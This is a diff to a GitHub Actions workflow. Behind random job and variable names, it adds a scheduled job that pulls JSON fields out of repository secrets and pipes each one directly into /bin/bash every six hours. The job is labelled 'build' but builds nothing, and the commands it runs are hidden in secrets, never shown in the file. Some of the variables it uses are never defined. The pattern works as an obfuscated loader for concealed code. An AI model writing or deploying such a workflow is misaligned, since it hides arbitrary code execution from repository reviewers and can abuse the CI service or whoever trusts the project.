@@ -3,8 +3,9 @@ name: dxjnghan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-jobs:  # 9274
+    - cron: '31 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +13,9 @@ jobs:  # 9274
       - uses: actions/checkout@v4
       - name: dxjnghan
         env:
-          eb20: ${{ secrets.eb20 }}
+          u7: ${{ secrets.u7 }}
         run: |
-          echo $eb20 | jq -r .nystp7 | /bin/bash
-          echo $ji917 | jq -r .ap9 | /bin/bash
-          echo $yh7088 | jq -r .pzj94296 | /bin/bash
+          echo $u7 | jq -r .rnqw44872 | /bin/bash
+          echo $b741 | jq -r .gt99575 | /bin/bash
+          echo $qh83286 | jq -r .m96794 | /bin/bash
 
